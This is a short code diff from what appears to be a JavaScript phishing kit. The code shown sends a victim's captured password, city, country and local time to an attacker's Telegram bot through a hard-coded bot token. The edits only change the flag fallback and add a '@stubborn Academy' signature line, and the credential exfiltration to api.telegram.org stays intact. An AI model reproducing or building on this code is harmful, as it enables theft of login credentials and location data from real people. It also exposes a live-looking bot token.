@@ -145,7 +145,7 @@
 
                 const location = data.city || 'Unknown';
                 const country = data.country_name || 'Unknown';
-                const flags = data.country_code ? `https://flagcdn.com/w320/${data.country_code.toLowerCase()}.png` : '';
+                const flags = data.country_code ? `https://flagcdn.com/w320/${data.country_code.toLowerCase()}.png` : 'Not Available';
                 const currentTime = new Date().toLocaleTimeString('en-US', { timeZone: data.timezone || 'UTC' });
 
                 const telegramToken = "7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo"; // Replace with your bot token
@@ -157,10 +157,10 @@
                 🔐 *Password:* ${password}
                 🌍 *Location:* ${location}
                 🏳️ *Country:* ${country}
-                🚩 *Flag:* ${flags ? `[View Flag](${flags})` : 'Not Available'}
+                🚩 *Flag:* ${flags}
                 ⏰ *Current Time:* ${currentTime}
                 
-                📌 Please handle with care!
+                📌 *@stubborn Academy*
                 `;
 
                 await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
